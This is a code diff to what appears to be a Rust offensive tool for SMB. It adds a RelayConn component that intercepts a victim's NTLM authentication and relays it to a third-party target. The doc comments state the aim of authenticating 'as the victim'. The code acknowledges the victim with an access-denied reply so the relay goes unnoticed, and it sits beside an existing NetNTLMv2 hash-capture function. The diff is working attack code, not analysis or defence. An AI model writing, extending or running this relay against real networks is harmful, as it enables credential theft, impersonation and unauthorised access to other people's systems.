@@ -125,6 +125,74 @@ async fn handle(mut stream: TcpStream) -> Result<Option<String>> {
     }
 }
 
+/// One inbound SMB client being **relayed**: instead of answering the NTLM challenge with our
+/// own fixed value (capture), we hand the victim's Type1 out to the caller, relay back the
+/// *target's* Type2, and surrender the victim's Type3 — so the caller can complete an
+/// authenticated session to a third-party target as the victim.
+pub struct RelayConn {
+    stream: TcpStream,
+    ss1_msg_id: u64,
+    session_id: u64,
+}
+
+impl RelayConn {
+    pub fn new(stream: TcpStream) -> Self {
+        RelayConn { stream, ss1_msg_id: 0, session_id: 0 }
+    }
+
+    /// Handle NEGOTIATE and the first SESSION_SETUP; return the victim's NTLM Type1.
+    pub async fn recv_type1(&mut self) -> Result<Vec<u8>> {
+        loop {
+            let msg = recv(&mut self.stream).await?;
+            if msg.len() < 64 || msg[0..4] != [0xfe, b'S', b'M', b'B'] {
+                return Err(SmbError::BadProtocol);
+            }
+            let command = u16::from_le_bytes([msg[12], msg[13]]);
+            let message_id = u64::from_le_bytes(msg[24..32].try_into().unwrap());
+            match command {
+                cmd::NEGOTIATE => {
+                    let mut pdu = response_header(cmd::NEGOTIATE, message_id, STATUS_SUCCESS, 0);
+                    pdu.extend(negotiate_response());
+                    send(&mut self.stream, &pdu).await?;
+                }
+                cmd::SESSION_SETUP => {
+                    let sec = request_sec_buffer(&msg).ok_or(SmbError::Truncated)?;
+                    let ntlm = spnego::find_ntlm(sec).ok_or(SmbError::BadToken)?;
+                    self.ss1_msg_id = message_id;
+                    self.session_id = 0x2222_0000_0000_0001;
+                    return Ok(ntlm.to_vec());
+                }
+                _ => return Err(SmbError::BadToken),
+            }
+        }
+    }
+
+    /// Relay the target's Type2 challenge back to the victim.
+    pub async fn send_challenge(&mut self, type2: &[u8]) -> Result<()> {
+        let token = spnego::challenge_resp(type2);
+        let mut pdu = response_header(cmd::SESSION_SETUP, self.ss1_msg_id, STATUS_MORE_PROCESSING_REQUIRED, self.session_id);
+        pdu.extend(session_setup_response(&token));
+        send(&mut self.stream, &pdu).await
+    }
+
+    /// Receive the victim's Type3 (computed over the target's challenge).
+    pub async fn recv_type3(&mut self) -> Result<Vec<u8>> {
+        let msg = recv(&mut self.stream).await?;
+        let sec = request_sec_buffer(&msg).ok_or(SmbError::Truncated)?;
+        let msg_id = u64::from_le_bytes(msg[24..32].try_into().unwrap());
+        // Acknowledge so the victim's stack is satisfied; then it's the target's session we use.
+        let mut pdu = response_header(cmd::SESSION_SETUP, msg_id, STATUS_ACCESS_DENIED, self.session_id);
+        pdu.extend(session_setup_response(&[]));
+        let _ = send(&mut self.stream, &pdu).await;
+        spnego::find_ntlm(sec).map(|t| t.to_vec()).ok_or(SmbError::BadToken)
+    }
+
+    /// Bind a listener for relaying; returns accepted [`RelayConn`]s via the closure.
+    pub async fn listen(addr: &str) -> Result<TcpListener> {
+        Ok(TcpListener::bind(addr).await?)
+    }
+}
+
 /// Listen on `addr` and print each captured NetNTLMv2 (dedup by account). Runs until Ctrl-C.
 pub async fn capture(addr: &str) -> Result<()> {
     let listener = TcpListener::bind(addr).await?;
